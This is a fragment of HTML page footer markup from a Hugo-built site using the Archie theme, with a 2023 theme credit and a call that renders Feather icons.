<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>